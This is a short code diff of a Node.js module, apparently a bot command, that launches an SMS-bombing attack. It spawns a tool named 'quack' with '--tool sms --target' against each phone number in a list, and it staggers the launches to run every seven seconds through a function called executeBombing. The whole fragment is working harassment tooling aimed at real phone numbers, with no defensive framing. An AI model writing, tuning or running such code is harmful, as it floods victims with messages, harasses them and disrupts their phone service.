@@ -24,10 +24,10 @@ module.exports = {
                 }
 
                 for(let i=0; i<numbers_filtered.length; i++){
-                    const ls = spawn("quack", ["--tool", "sms", "--target", numbers_filtered[i], "--timeout", args[1], "--threads", "10"]);
                     setTimeout(function(){
-                        executeBombing(ls);
-                    }, i * 1000)
+			const ls = spawn("quack", ["--tool", "sms", "--target", numbers_filtered[i], "--timeout", args[1], "--threads", "10"]);
+			executeBombing(ls);
+                    }, i * 7000)
                 }
             })
         }
